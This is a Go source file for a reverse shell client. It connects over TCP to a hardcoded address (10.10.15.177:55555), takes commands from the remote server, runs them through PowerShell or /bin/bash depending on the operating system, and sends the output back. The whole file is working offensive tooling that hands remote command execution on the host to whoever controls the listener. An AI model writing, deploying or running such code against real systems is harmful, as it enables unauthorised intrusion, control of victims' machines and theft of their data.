package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

const ipAddr = "10.10.15.177" // IP address of the server.
const socketPort = "55555"       // Port address of the socket server.

var path string = ""

// Function to execute a shell command.
// Returns the outpput of the command that is run.
func Execute(value string, conn *net.Conn) {
	name := "windows" // Default OS

	// Check for different OS runtimes.
	switch runtime.GOOS {
	case "windows":
		name = "powershell"
		value = "-Command" + " " + value
	default:
		name = "/bin/bash"
		value = "-c" + " " + value
	}

	fmt.Println(name, value)

	tmp := strings.Split(value, " ")

	// The ellipsis (...) indicates that a slice or array should be "expanded" into individual arguments for the function.
	cmd := exec.Command(name, tmp...)
	cmd.Dir = path
	output, err := cmd.Output()

	// Return Error message if err != nil
	if err != nil {
		panic(err)
	}

	// Check for a change in directory.
	if strings.HasPrefix(string(output), "cd") {
		val := ""
		tmp := strings.Split(string(output), " ")
		val = strings.Trim(tmp[1], "\r")
		err := os.Chdir(val)
		if err != nil {
			fmt.Println(err.Error())
		}
		path, _ = os.Getwd()
		(*conn).Write([]byte(path))
		return
	}

	// Write the output of the executed command to the connection.
	(*conn).Write([]byte(output))
}

func main() {

	// Tries to establish a TCP connection with the service hosted on {ipAddr}:{port}
	// Exits (panic) the program if it fails to establish a connection
	conn, err := net.Dial("tcp", ipAddr+":"+socketPort)
	if err != nil {
		panic(err)
	}

	// Close the connection just before exiting the main function.
	defer conn.Close()

	// Changes the directory of the program to root ("/") directory
	path, _ = os.Getwd()

	for {

		// Buffer to store the incoming data from the server.
		// Does not work with buff := []byte.
		// Exits the infinite loop if an error is encountered.
		buffer := make([]byte, 2048)

		_, err := conn.Read(buffer)
		if err != nil {
			fmt.Println(err)
			break
		}

		// Trim the leading and trailing null(\x00) values
		// as string length can be less than the buffer size of 2048 bytes.
		command := strings.Trim(string(buffer), "\x00")[1:]

		// Exit the infinite loop if command is "exit".
		if strings.Compare(command, "exit") == 0 {
			break
		}

		// Dispatch a goroutine for each command.
		go Execute(command, &conn)

	}

}
